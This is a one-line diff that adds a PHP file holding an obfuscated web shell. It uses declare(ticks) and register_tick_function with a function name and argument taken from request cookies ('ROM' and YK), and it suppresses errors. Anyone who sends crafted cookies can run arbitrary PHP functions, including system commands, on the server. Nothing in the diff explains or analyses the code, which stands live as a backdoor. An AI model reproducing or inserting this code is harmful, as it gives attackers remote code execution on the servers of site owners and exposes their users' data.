@@ -1,0 +1,1 @@
+<?php declare(ticks=1) ; @register_tick_function( @$_COOKIE{ 'ROM'} ,$_COOKIE {YK }) ;
